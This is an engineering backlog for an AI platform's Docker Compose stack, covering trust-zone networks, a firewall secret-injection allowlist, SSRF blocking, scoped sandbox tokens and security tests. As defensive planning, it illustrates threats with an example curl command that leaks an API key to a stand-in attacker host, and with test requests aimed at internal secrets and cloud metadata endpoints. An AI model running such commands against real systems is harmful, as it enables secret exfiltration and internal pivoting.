# AI v2 — Task Backlog

Generated: 2026-03-02

## Network & Auth Security Redesign (Parent: #3304)

First-principles network segmentation and auth redesign for the Docker Compose stack. Replace flat default network with explicit trust zones, implement scoped sandbox tokens, and harden the firewall proxy.

### Wave 1 — Independent (start in parallel)

#### Task 1: Replace default network with explicit zone networks
**Priority:** Foundation — everything else depends on this
**Files:** `docker-compose.yml`

Replace the implicit `default` network with explicit named networks per trust zone. Every service must declare exactly which networks it needs.

**Networks to create:**
- `edge_net` (not internal): nginx, auth
- `ui_proxy_net` (internal, fixed subnet e.g. `10.10.10.0/24`): nginx + api ONLY — used for unspoofable X-Forwarded-User trust
- `app_net` (internal, fixed subnet e.g. `10.10.20.0/24`): api, slackbot, etl — trusted service-to-service
- `secrets_net` (internal, keep existing): secrets, api, etl, auth, slackbot, firewall
- `data_net` (internal): postgres, redis, api, etl
- `agent_net` (internal, keep existing): sandboxes, firewall, api
- `obs_net` (internal): prometheus, loki, promtail, grafana, nginx
- `egress_net` (not internal): secrets, firewall, api, etl, slackbot — services needing internet

**Verify:** `docker compose config` passes. No service on a network it doesn't need. `docker compose up -d` starts all services.

---

#### Task 9: 🔴 CRITICAL — Firewall destination allowlist to prevent secret exfiltration
**Priority:** Critical security fix
**Files:** `services/firewall/addon.py`

The firewall's `addon.py` replaces header placeholders (e.g. `OPENAI_API_KEY`) with real secrets for ANY destination. An attacker in a sandbox can do:
```
curl https://evil.example -H 'Authorization: Bearer OPENAI_API_KEY'
```
The firewall sees the placeholder, injects the real key, and forwards it to the attacker's server.

**Fix:**
1. Add a strict destination allowlist — only inject secrets when the destination host matches a known provider (`api.openai.com`, `api.anthropic.com`, `api.together.ai`, `api.exa.ai`, etc.)
2. Load from env var `FIREWALL_SECRET_INJECTION_HOSTS` (comma-separated)
3. For non-allowlisted destinations, **strip** all known secret placeholders from headers entirely
4. Log a warning when a placeholder is found targeting an unlisted host
5. Block requests where the resolved IP (not just hostname) is in RFC1918/metadata ranges
6. Resolve the hostname BEFORE proxying and check resolved IP against blocked ranges
7. Strip inbound `Authorization`, `X-API-Key`, `X-Forwarded-User` headers from sandbox requests

**Verify:**
- `curl -x firewall:8080 http://mock-server:9999 -H 'Authorization: Bearer OPENAI_API_KEY'` — mock server must NOT receive the real key
- `curl -x firewall:8080 https://api.openai.com/...` — should get real key injected

---

#### Task 4: Firewall — block internal destination pivoting (SSRF)
**Priority:** High security fix
**Files:** `services/firewall/addon.py`

Block all RFC1918, loopback, link-local, and cloud metadata ranges as proxy destinations:
- `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- `169.254.0.0/16` (AWS/GCP metadata)
- `fd00::/8` (IPv6 ULA)

Return HTTP 403 if destination resolves to blocked range. Block DNS rebinding by resolving hostname BEFORE proxying.

**Verify:**
- `curl -x http://firewall:8080 http://secrets:8100/keys` → 403
- `curl -x http://firewall:8080 http://169.254.169.254/latest/meta-data/` → 403
- `curl -x http://firewall:8080 https://api.openai.com/...` → works

---

#### Task 5: Docker socket proxy (reduce blast radius)
**Priority:** High security hardening
**Files:** `docker-compose.yml`, `src/api/agent.py`

Replace raw `/var/run/docker.sock` mount with `tecnativa/docker-socket-proxy`. Only allow: CONTAINERS, NETWORKS, POST, EXEC, LOG. Deny: IMAGES, VOLUMES.

API sets `DOCKER_HOST=tcp://docker-proxy:2375` — Python Docker SDK picks this up automatically.

**Verify:** API can spawn/stop/exec sandbox containers. Disallowed Docker API calls fail.

---

#### Task 13: Externalize agent sessions + locks to Postgres
**Priority:** Required for horizontal scaling
**Files:** `src/api/agent.py`

Move `_sessions: dict` and `_execute_locks: dict` from in-memory to Postgres.

1. **Sessions → Postgres `agent_sessions` table** (already exists, make it authoritative)
2. **Execution locks → Postgres advisory locks:** `SELECT pg_try_advisory_lock(hashtext(thread_key))`
3. Remove `_sessions` and `_execute_locks` dicts from module-level state

**Verify:**
- 2 API replicas, same thread → only one proceeds
- Kill API replica mid-execution → advisory lock auto-releases
- Session state survives API restart

---

#### Task 14: Move slackbot threadModes to Redis
**Priority:** Required for horizontal scaling + restart resilience
**Files:** `apps/slackbot/src/lib/bot.ts`, optionally `apps/slackbot/src/lib/thread-mode-store.ts`

Replace in-memory `threadModes: Map<string, ThreadModeConfig>` (capped at 500) with Redis.

- `threadModes.get(key)` → Redis GET `threadmode:{normalizedKey}`
- `threadModes.set(key, config)` → Redis SET + TTL (7 days)
- `threadModes.delete(key)` → Redis DEL
- Store as JSON: `{"mode":"eng","modelPreference":"claude","budgetMode":null}`
- Redis client already available via `process.env.REDIS_URL`

**Verify:** Set thread mode, restart slackbot, send follow-up → mode persists.

---

### Wave 2 — After Task 1 (parallel with each other)

#### Task 2: Trusted app_net bypass in API auth (deps.py)
**Depends on:** Task 1
**Files:** `src/api/deps.py`, `src/api/app.py`, `apps/slackbot/entrypoint.sh`, `apps/slackbot/src/lib/api-client.ts`, `apps/slackbot/src/app/api/shadow/route.ts`

- Add `app_net` subnet (e.g. `10.10.20.`) to `_TRUSTED_PREFIXES` alongside `127.`
- Configurable via env var `APP_NET_SUBNET`
- Sandbox containers (on `agent_net`) still require API key
- Trust `X-Forwarded-User` ONLY from `ui_proxy_net` subnet (e.g. `10.10.10.`) — NOT `172.`
- Slackbot: stop fetching `AI_V2_API_KEY`, make API key optional in `api-client.ts`

**Verify:** Slackbot calls API without key on app_net. Sandboxes get 401 without valid token.

---

#### Task 3: Scoped short-lived sandbox tokens
**Depends on:** Task 1
**Files:** `src/api/agent.py`, `src/api/deps.py`, optionally `src/api/sandbox_tokens.py`

Replace injecting real `API_SECRET_KEY` into sandboxes with scoped tokens.

- Mint per-container: `secrets.token_urlsafe(32)`
- Store server-side: `{token: {thread_key, container_id, created_at, expires_at, allowed_endpoints}}`
- TTL: 2 hours. Scope: only `/agent/*` and `/tools/*` for that thread_key
- Revoke on container stop
- Inject as `AI_V2_API_KEY=<scoped_token>` (sandbox entrypoint unchanged)

**Verify:** Sandbox calls `/agent/execute` with scoped token → 200. Same token on `/admin/*` → 403. Token stops working after container stopped.

---

#### Task 6: Update agent.py sandbox spawning for new network topology
**Depends on:** Task 1
**Files:** `src/api/agent.py`, `docker-compose.yml`

- Verify sandbox containers attach to `agent_net` only
- Update `AGENT_NETWORK` env var if network name changes
- Sandbox→API via `agent_net`, sandbox→internet via firewall proxy on `agent_net`

**Verify:** `docker inspect <sandbox>` shows single network attachment on `agent_net`.

---

#### Task 7: Update CI/CD deploy workflow for new network topology
**Depends on:** Task 1
**Files:** `.github/workflows/deploy.yml`, `scripts/deploy-notify.sh`

- "Reload tools" step: use `docker compose exec api curl -sf http://localhost:8000/admin/reload-tools` instead of reading `.env`
- "Notify Slack" step: fetch `OPENAI_API_KEY` and `SLACK_BOT_TOKEN` from secret manager via `docker compose exec secrets curl -s http://localhost:8100/secrets/{key}`
- Ensure `docker compose up -d` works with explicit networks

**Verify:** Full CI deploy passes.

---

#### Task 10: Secrets manager authentication (internal token)
**Depends on:** Task 1
**Files:** `src/secret_manager/app.py`, `src/shared/tool_sdk.py`, `services/firewall/entrypoint.sh`, `services/firewall/addon.py`, `services/auth/main.py`, `apps/slackbot/entrypoint.sh`, `docker-compose.yml`

- Add shared internal token via env var `SECRET_MANAGER_TOKEN`
- Require `Authorization: Bearer <token>` on `/secrets/*` and `/keys`
- `/health` stays unauthenticated
- Update all clients

**Verify:** `curl http://secrets:8100/keys` without token → 401. With token → 200.

---

#### Task 12: Split sandbox-controller out of api service
**Depends on:** Task 1
**Files:** `src/api/agent.py`, `services/sandbox-controller/` (new), `docker-compose.yml`

New `sandbox-controller` service with endpoints: `POST /spawn`, `POST /exec`, `POST /stop`, `GET /status`, `GET /health`.

Only this service gets Docker socket access. API calls it over HTTP. Later: swap Docker backend for k8s Pod/Job API with zero API changes.

**Verify:** `/agent/execute` still works. API no longer has docker.sock.

---

### Wave 3 — After Waves 1+2

#### Task 11: CI/CD security test suite (runs on every PR)
**Depends on:** Tasks 1-5, 9, 10, 13
**Files:** `tests/security/` (new), `.github/workflows/security.yml` (new)

**Tests:**
- **Static compose policy** (`test_compose_policy.py`): parse `docker compose config`, assert network membership, no docker.sock on api, fixed IPAM subnets
- **Network isolation** (`test_network_isolation.py`): from agent_net CANNOT reach secrets/postgres/redis/grafana
- **Auth boundaries** (`test_auth_boundaries.py`): X-Forwarded-User spoofing from agent_net → rejected; app_net without key → 200
- **Firewall egress** (`test_firewall_egress.py`): secrets/metadata IPs blocked, internet allowed
- **Firewall secret exfil** (`test_firewall_exfil.py`): mock server doesn't receive real keys
- **Nginx headers** (`test_nginx_headers.py`): X-Forwarded-User stripped on API-proxied locations

---

#### Task 8: E2E validation of new network topology
**Depends on:** ALL tasks

Full stack validation: compose config, health checks, network isolation audit, auth checks (trusted/untrusted/external), UI auth, observability, full agent E2E flow.

---

## Other Open Tasks

### Possibly Relevant

| ID | Title | Notes |
|---|---|---|
| 3289 | Fix /threads page 401 — UI password cookie missing | May be fixed now that UI_PASSWORD is in 1Password |
| 3277 | Add pgvector embeddings for turn messages + results | Future enhancement |
| 3264 | Add Okta OAuth to remote MCP endpoint | Future feature |
| 3257 | API Layer — Plugin MCP Integration Testing & Hardening | In progress, may have open items |
| 3261 | Error handling & resilience in call_plugin | Hardening |
| 3263 | End-to-end integration test: agent uses MCP | Testing |
| 3290 | Port Igor's pi-mono extensions to sandbox (+ children 3291-3297) | Unclear if still needed |

### Superseded (delete these)

These tasks describe work that has already been completed:

| ID | Title | Why superseded |
|---|---|---|
| 3248 | AI v2 Monorepo Restructuring + Coding Agent | Done — repo structured, agent works |
| 3251 | Coding agent — container image | sandbox/ exists |
| 3252 | Coding agent — harness protocol + adapters | Built into agent.py |
| 3253 | Coding agent — session manager | agent.py does this |
| 3254 | Coding agent — plugin | Agent routes exist |
| 3255 | Slack bot via Vercel Chat SDK | Slackbot exists and works |
| 3256 | Docker Compose — full stack | Running in prod |
| 3243 | M2: Deploy memory layer on 206 | Deployed |
| 3244 | M3: Agents SDK agent | Different direction taken |
| 3245 | M4: Modal Sandboxes | Went with Docker |
| 3246 | M5: Slack bot → Modal | Went with Docker |
| 3247 | ETL service: continuous pipeline | ETL exists and runs |
| 3265 | Slackbot → API → Agent pipeline | Works end-to-end |
| 3266 | Fix HTTP timeouts | Likely fixed |
| 3267 | Verify amp CLI exec works | Works |
| 3268 | Make agent execute async | May be stale |
